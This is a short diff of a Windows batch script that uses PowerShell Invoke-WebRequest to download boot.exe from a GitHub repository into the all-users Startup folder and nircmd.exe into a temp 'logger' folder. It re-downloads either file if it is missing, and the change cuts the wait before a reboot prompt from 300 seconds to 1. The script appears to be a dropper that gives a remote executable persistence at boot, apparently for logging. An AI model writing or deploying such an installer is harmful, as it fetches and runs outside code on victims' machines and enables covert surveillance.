@@ -3,7 +3,7 @@
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
 :rebootpls
-timeout 300
+timeout 1
 :check
 if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" if exist "%temp%\logger\nircmd.exe" goto rebootprompt
 if not exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
